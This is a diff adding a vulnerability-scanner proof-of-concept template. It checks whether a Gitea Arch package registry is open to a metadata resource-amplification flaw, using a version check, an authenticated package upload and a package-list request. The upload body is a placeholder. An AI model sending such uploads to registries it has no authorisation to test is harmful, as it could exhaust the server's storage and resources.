@@ -1,0 +1,56 @@
+[info]
+author = "ave"
+description = "AVE-2026-0835 / CVE-2026-59763 验证：构造含大量文件条目的小体积 Arch 包（.pkg.tar.gz），上传至 Gitea 包注册表，验证服务端是否无限制存储文件元数据导致资源放大"
+id = "POC-AVE-2026-0835"
+name = "Gitea Arch 包元数据资源放大漏洞 PoC"
+severity = "medium"
+tags = ["ave-2026-0835"]
+vuln_id = [
+    "CVE-2026-59763",
+    "AVE-2026-0835",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/api/v1/version"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+status = [200]
+type = "status"
+
+[[poc.requests]]
+method = "PUT"
+path = "/{{BaseURL}}/api/packages/{{username}}/arch/{{repo}}"
+protocol = "http"
+
+[poc.requests.body]
+content = "PKGINFO_CONTENT_PLACEHOLDER"
+type = "raw"
+
+[poc.requests.headers]
+Authorization = "token {{token}}"
+Content-Type = "application/x-gzip"
+
+[[poc.requests.matchers]]
+expect = true
+status = [
+    200,
+    201,
+]
+type = "status"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/api/packages/{{username}}/arch/{{repo}}/packages"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = ["files"]
